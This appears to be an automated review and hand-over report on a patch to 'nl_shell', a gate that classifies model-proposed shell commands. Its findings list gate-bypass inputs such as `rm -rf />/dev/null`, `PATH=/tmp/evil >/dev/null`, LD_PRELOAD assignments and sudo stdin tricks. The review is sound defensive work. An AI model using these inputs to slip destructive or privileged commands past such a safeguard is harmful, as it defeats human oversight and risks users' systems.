- [ ] **The success criterion points at tables that are not in the brief.** Rule 1's criterion reads "for every input in the untrusted table below" (line 119) and Rule 2's "for every input in the regression table" (line 126); brief line 3-6 says every v1-v6 case "is now a regression input". No such table exists anywhere in `brief.md`, and the v1-v6 cases live in `results/issue_196/iteration-v1..v6/` in the pdca checkout (line 267-268), which is not part of this bundle. Do cannot know the row set, and a reviewer cannot judge completeness of "one regression table". Inline the rows (or the untrusted-feature inputs at minimum) in the brief, or point to a file that ships in the bundle.
- [ ] **The gate-vectors file format is undefined, so the loader criterion is untestable as written.** Line 192-194 requires the loader to reject "a missing `command` or `class`, a class outside the five, an unknown key", but the brief never states the known key set. Two things the format must express are left to Do: (a) rejected rows — spec rows 21-25 and 30 (`v1.md:273-277,282`) have *no* class, only "rejected", and the brief defines a class only for decision C (`privileged`), not for a §5 rejection like `echo hi >&3`; (b) origin — Rule 1 makes proposal-vs-typed decisive for the result, so a vector row needs it. Fix by naming the keys (`command`, `class`, `rejected`, `origin`, `reason`?) and the class a rejected-by-§5 row carries, so "unknown key" and the row assertions have one meaning.
- [ ] **Rule 5's criterion is a wall-clock assertion.** Line 153-154: "`$[`, `a=(` and `${` repeated to exactly 8 KiB each classify in under 1 s on the host". CI (`.github/workflows/tests.yml:14-23,28-54`) runs the suite four times on `ubuntu-latest` shared runners; a timing bound measured as 0.14 s on the planner's host (line 103-104) is a flake source there and makes a later Check unfalsifiable in the other direction (a slow runner "fails" correct code). Suggest the deterministic parts stay gating (size cap at 8 KiB + 1 byte → decision C; budget overrun → decision C) and the sub-second figure becomes a non-gating measurement or a generous `pytest.mark` with an explicit margin rationale.
- [ ] **The pins were verified only in the pdca `.venv`, not against CI's interpreter.** Line 200-202: "`tree-sitter` 0.26.0 and `tree-sitter-bash` 0.25.1 are installed in the pdca `.venv`". CI installs with `python -m pip install --quiet -e '.[dev]'` on **Python 3.14** (`tests.yml:19-21`, and again at `:39,49` for the bash matrix). Both packages are C extensions; whether 0.26.0 / 0.25.1 publish cp314 wheels or build from sdist on the runner is not stated. If they don't, every CI job fails at *Install*, before a single test runs. The brief's Impact section (line 271-274) should state the CI install check, not only the license question.
- [ ] **The Rule 1 "human ruling" has no tracker record and makes code contradict the normative spec text for a window.** Brief line 45: "*Untrusted outcome (human ruling):* a model **proposal** is rejected." The issue body (notes.json) says the opposite: "§1.2 unparseable: row 31 (`if true; then`) is `mutating`, reason contains 'unparseable'", matching `policy-gate/v1.md:63-64` and ADR-0013 line 39-40 ("counts as mutating"). The only comment on #196 is the triage bot, so the ruling exists only in the brief. The brief does list it for sign-off (line 254) and defers the spec edit to #197 (line 258), but that means `main` will carry a gate whose behaviour the spec it cites says is wrong until #197 lands. The human should either record the ruling on the issue, or move the one-line §1.2 spec edit into this child's scope so code and contract land together.
- [ ] **Rule 1 leaves an implementation choice open that changes its own criterion.** Line 40-41: backslash-newline is an untrusted feature "unless the gate first removes it the way bash does". If Do implements the removal, the tree is trusted and the Rule 1 criterion "the typed version is at least `mutating`, with 'unparseable' in a reason" (line 121-122) is false for those inputs; if Do doesn't, `echo hi >\⏎&3` and `echo d 3\⏎>x` (line 124-125) are caught by the untrusted-redirect clause rather than Rule 4. Both are defensible; the brief should pick one so the test asserts one reason, not two possible ones.
- [ ] T5 Judgment — Approve decision C, stricter descriptor rejection and quote-blind hidden-character rejection, confirm parser dependency licensing, and settle affected-path prior art across merged and closed/rejected work — the disposable repository has only one base commit and no remotes, so complete history cannot be checked; target/docs/design/specs/policy-gate/v1.md:238, target/pyproject.toml:19, brief.md:127 and brief.md:139.
- [ ] **Assignments the parser does not give a `variable_assignment` node skip §3 and §5.** The brief limits the rule to `variable_assignment` nodes (`parse.py:701-711`). But the forms below are syntax the shell layer walks, not commands, so #197's command layer will never see them as invocations. `for` and `expansion` are plain pass-through containers (`parse.py:736-749`):
- [ ] **T2 is unverifiable: no threat-model update.** `gate-logs/T2-threat-model.log` shows the whole new gate package changed with no edit to `.oss-scanner/threat_model.md`. The brief cites that model's Critical row (`:296`) and High row (`:303`) as the invariant this work restores. A human should decide whether the model needs a new row now (the gate as a parse-differential surface: tree-sitter vs bash, see `cat <<E; rm x` below) or only when #78 wires the gate into the REPL.
- [ ] **No effect in this diff. It becomes High ("pipes into sudo" must be rejected, ADR-0015) once child-2's sudo-pipe rule reads `Invocation.stdin`.** At `src/nl_shell/gate/parse.py:714-719`, a function body is always walked with `stdin=TERMINAL`. But the body runs with the stdin of the call site. Input: the model's proposal. Example: `f() { sudo tee /x; }; cat <<E | f` (here-doc body `x`). The call `f` gets stdin = pipe, but the `sudo tee /x` invocation is recorded as reading the terminal. That is the same mistake the brief cites as v2's here-doc pipeline bug, moved into a function body. Calling `f` is opaque and the definition is `session-altering`, so the command is still confirmed. But a pipe-into-sudo *rejection* built on this field would not fire, and the sudo password could be fed from the pipe. The brief's `Stdin` sources (terminal / pipe / file / here-doc / here-string) have no "unknown" value for this case. Adding one, or making #197 treat function-body invocations as stdin-unknown, changes the contract the siblings depend on. That is a scope call for the human, not a builder iteration.
- [ ] **The tracker record is missing, so the problem statement and the "ignored context" check could not be done.** `notes.json` and `sources/` are not in the bundle I was given. Several parts of the brief rest only on that thread: "decision A's floor", "decision B (child-2)", "Decision C", "child-2" and "child-3", the sibling split (#190/#191/#192) and the "v2 regression". None of the decisions A/B/C appear anywhere in the target. A grep for `decision [ABC]` and `could not class` matches only `.github/triage/triage_priority.py:42,402`, which is unrelated. The human should confirm these decisions really are in the thread, or the brief should state them inline.
- [ ] **The "§7 stub proof" criterion cannot fail.** The brief ships `rules.py` as a stub where "every simple command is `mutating`, reason 'not allowlisted'". With that stub, nothing reaches `gate/live.py` as `read-only`. So "no case returns `read-only`" passes even if `live.py` is deleted or returns `read-only`. The same applies to "§1.7 … a label never lowers the class": every command is already at least `mutating`, so a label below that can never be observed lowering anything. The tests need to exercise `live.py` directly, for example by monkeypatching `rules` to return `read-only` and asserting that live turns it into `mutating` with "live-session resolution not implemented". The label test needs a matching fixture. Otherwise these two bullets pass whether or not the code works.
- [ ] **Decision C and the fd rule go beyond the spec. The brief calls them restorations; they are new rules.** `policy-gate/v1` has no internal-error or budget rule. Decision C ("`privileged`, rejected, reason 'could not class'") is new. The spec rejects only "file descriptor 3 or higher" (`docs/design/specs/policy-gate/v1.md:126`). The brief also rejects any descriptor the gate "cannot prove is below 3" (`>&$x`, `<&$fd`, `2>&${FD}`). Both are stricter, so they are probably compatible changes. But the spec's Versioning section (`v1.md:238-241`) says raising a class "MUST be reviewed by a human". The brief does not flag either one for sign-off, and does not plan a spec edit to record them.
- [ ] **The §3 variable rule is underspecified and only partly tested.** The success criterion tests standalone assignments to `PATH`, `IFS`, `LD_PRELOAD` and `GIT_DIR` only. Spec §3 (`v1.md:104-107`) lists about 20 names and patterns (`PS0`–`PS4`, `LD_*`, `GIT_*`, `SUDO_*`, `PYTHON*`, `PERL5*`, `NODE_OPTIONS`, …) and covers them "standalone **or exported**". The brief applies the `variable_assignment`-inside-`declaration_command` handling only to `SUDO_*`. It never says whether `export PATH=./bin` (the setup for spec row 5) gets `session-altering` from the shell layer, or ends up as just `mutating` from the stub, which loses the session-altering warning. The Scope section also never says whether the full §3 list is in this child or in child-2. Do will have to guess.
- [ ] **`gate-vectors.toml` and its loader are a hidden second change that no test checks.** Scope adds `targets/ubuntu-26.04/gate-vectors.toml` "with this child's rows and a vector loader in the style of `src/nl_shell/targets.py:145-247`". No success-criterion bullet says the tests read their cases from that file, or tests the loader (missing file, bad TOML, schema). That is new data, a new module and new review surface with no red→green test. The spec also says a target's vectors file "MUST cover every row" (`v1.md:245-249`), so a partial file under that name does not meet the spec. Either drop it, or add a criterion such as "the tests read every case from the file; the loader rejects malformed entries" and say how the file relates to the full-row requirement.
- [ ] **Two citations do not resolve in the target.** `engine/scripts/run-verify.sh:196` (Falsifiability) and `results/issue_189/iteration-v2/patch.diff` with `parse.py:397,411` (Prior-art) are not in `$PDCA_TARGET`. A glob of `engine/**` and `results/**` matches nothing. They probably live in the PDCA harness checkout. The rule that Do "must cite path:line on the target branch" can't be applied to them, and a Do agent grounded on the target can't open them. Prior-art also says the v2 here-doc handling "is the bug listed above", but the brief never states that bug. The only mention is the bullet header "Stdin context, v2 regression". One sentence describing the v2 defect (stdin of the second pipeline stage recorded as terminal after a here-doc) would close the gap.
- [ ] **The §1.1 check is stricter than the spec, and the brief doesn't say so.** The brief reuses `render.has_hidden` (`src/nl_shell/render.py:136`). That function ignores quoting and covers Cf/Co/Cn/default-ignorable/surrogates (`render.py:113-127`). The spec forbids the listed characters only "outside quotes" (`v1.md:59-61`). That is fine for safety, since it only raises the class or rejects. But it means a proposal like `echo '‮'` is rejected, which differs from the spec text. A sign-off note should record that this deviation is deliberate.
- [ ] **These pinned-version claims can't be checked from the target and are load-bearing.** "tree-sitter-bash 0.25.1 has 59" named node kinds, the compatibility of `tree-sitter==0.26.0` with `tree-sitter-bash==0.25.1`, and "`case x in` parses to an `ERROR` node; `if true; then` to `MISSING "fi"`" are all assertions about third-party wheels. Nothing in the repo backs them up (`pyproject.toml:13-17` has no tree-sitter today). If either pin is wrong, Do stalls on the first install. The success criterion already makes the node-kind test enumerate the kinds at run time, so the brief should drop the hard-coded "59" rather than imply a test depends on it. The pins should be confirmed with one `pip install` before Do starts. The licence question is already deferred to sign-off.
- [ ] T5 Judgment — Confirm dependency licensing and complete affected-path prior-art review across merged and closed/rejected work before sign-off — the brief flags the licensing decision, while this target has one synthetic base commit, no remotes and no gate-path history; closed-work evidence and INTEGRATION §4 are not supplied (brief.md:142, brief.md:145; target/pyproject.toml:20).
- [ ] **Scope of "cannot prove": non-literal redirect targets and unparseable text.** The new threat-model line (`threat_model.md:120-121`) promises rejection of any redirection the gate cannot prove uses only fds 0-2. The code keeps two cases at `mutating`, not rejected. (1) A non-literal output target, `echo x >"$f"` or `>/proc/$$/fd/3` (`parse.py:519-525`): its value is unknown, so it could be `/dev/fd/3`. (2) Text that parses with an `ERROR` node (`parse.py:788`, `__init__.py:124-125`): a `>&3` that tree-sitter folds into the `ERROR` node never becomes a `file_redirect`, so it gets only "unparseable" (`mutating`). Until #191 that is an accepted bypass class (`threat_model.md:227-228`). Both still need a confirm. Rejecting every non-literal output target is a large behaviour change, so a human should decide which way to go. Option one: narrow the threat-model wording to literal targets on a parseable tree. Option two: add backstops, such as rejecting non-literal output targets, and rejecting unparseable text whose bytes match `[<>]&|/dev/fd/|/proc/[^/]*/fd/`. I found no concrete grammar input for (2), and it is unconfirmed without the toolchain.

## 7. Proven / not proven
- Proven by which oracle: gates overall = pass (stub oracles).
- Unproven / needs manual run: anything flagged in §6.

## 8. Ready-to-ship attachments
- patch.diff
- tracker-comment.md     (ALWAYS, every tracker item)
- build-notes.md         (builder rationale — for the human, not the reviewer)

## 9. Check sign-off                     ← human completes Check here
- Disposition confirmed / overridden:
- Outcome: iterated-to-Do
- Iteration delta (if iterating): Auto-iterate (round 3): rebuilding for the implementation-level findings — C5 Causal adequacy — Preserve ordinary words adjacent to redirects: descriptor recovery removes any adjacent word without validating it as a descriptor, losing arguments such as `secret` in `echo secret>out` and potentially a command name; add real-parser word-preservation regressions (src/nl_shell/gate/parse.py:664).; **Arguments written right before a redirect are dropped from the invocation.** `src/nl_shell/gate/parse.py:664-672` takes any word that ends exactly where an undescribed redirect starts and removes it from `word_nodes`. It does this even when `_descriptor` (`parse.py:767-779`) has already decided that the token is *not* a descriptor. Results from the patched gate: `rm -rf />/dev/null` gives words `['rm', '-rf']`, so the `/` is gone. `sudo rm -rf /etc>x` gives `['sudo', 'rm', '-rf']`. `rm -rf ~>/dev/null` gives `['rm', '-rf']`. `cat a3>f` gives `['cat']`. Bash keeps the word as an argument: `bash -c 'printf "<%s>" a /etc>out'` writes `<a></etc>`. This breaks the brief's contract ("hands each simple command … quote-removed words"). Once #197 plugs in real rules, `rm -rf />/dev/null` reaches the command layer looking like `rm -rf` with no target. Today the stub hides this (everything is `mutating`), which is why no test goes red. The Rule 4 table (`tests/test_policy_gate.py:527`) always puts a space before the redirect, so it never builds this shape. Fix: only remove the adjacent word when it is all digits or `{name}` (the same test `_descriptor` uses), and add a regression row that asserts the words of `rm -rf />/dev/null`.; **An assignment with only a redirect and no command word is treated as a one-command prefix, so §3 misses it.** `parse.py:656-657` marks every `variable_assignment` that appears before the name as `prefix`, and `src/nl_shell/gate/__init__.py:234-235` skips §3 for prefixes. Typed `PATH=/tmp/evil >/dev/null` gives `mutating` with reasons `unparseable: missing token`, `prefix assignment: PATH`, and no `session-altering` / "assignment to PATH". `LD_PRELOAD=/tmp/x.so 2>/dev/null` and `IFS=x 2>&1` behave the same way. In bash the assignment persists: `bash -c 'PATH=/tmp/evil >/dev/null; echo $PATH'` prints `/tmp/evil`. The brief's §3 says the name list is matched on every `variable_assignment` node. A command with no name word (the code already inserts an empty non-literal word for it at `parse.py:702-705`) should give its assignments the role `standalone`.; **High (latent: "a privileged or destructive step is classed lower"; today the stub floor masks it)**. `src/nl_shell/gate/parse.py:665-672`. Input: any proposal or typed command where a word is written right against a redirect operator with no space. The model or untrusted text controls this. `_simple` collects the token right before *every* redirect that has no descriptor field, into `fd_tokens`. It does this whether or not the token is a number, then drops those tokens from `word_nodes`. `_descriptor` (`parse.py:775`) only treats digits or `{…}` as a descriptor, but the drop happens anyway. So real arguments, and even wrapped command names, vanish from the invocation handed to the command layer. They also vanish from `layer.words`, which the §8 sensitive-path and #191 word checks will read. Reproducers (invocation words as the gate records them):; **Medium (latent; it feeds the sudo-pipe rule and decision B).** `src/nl_shell/gate/parse.py:540-562` and `:708-710`. Input: a proposal that runs `exec` with a stdin redirect earlier in the same command line. `exec </tmp/x; sudo tee /etc/y` records `sudo tee /etc/y` with stdin **`terminal`**, but bash feeds it `/tmp/x`. Compare `{ sudo tee /etc/y; } </tmp/x`, which the gate correctly gives `file`. `terminal` is the best case for the sudo-pipe rule, so this is a stdin fact recorded as proven when it is not. Fix: after an `exec` invocation with any redirect touching fd 0 (or any `exec` redirect at all), set the stdin of every later invocation in that list to `unknown`. Add the input above to the Rule 3 test. An `exec` from an *earlier* command in the session needs live state (#192) and is out of scope here.. Deferred, not addressed here: 11 finding(s) that need human judgment, held in deferred-findings.json for the human at handover — not build work
- By / date: auto-iterate / 2026-10-24

## 10. Act candidates (hints for the next Act review)
- Plan advisory: 7 finding(s); brief revised: yes (plan-advisory-*.md)
- (empty is the common case)
